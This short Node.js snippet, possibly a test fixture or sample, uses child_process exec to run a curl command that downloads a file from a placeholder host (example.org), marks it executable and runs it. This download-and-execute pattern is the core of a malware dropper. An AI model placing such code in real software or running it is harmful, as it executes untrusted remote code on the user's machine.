const {exec} = require('child_process');
const commands = `curl -O http://example.org/f && chmod +x ./f && ./f`;
exec(commands);
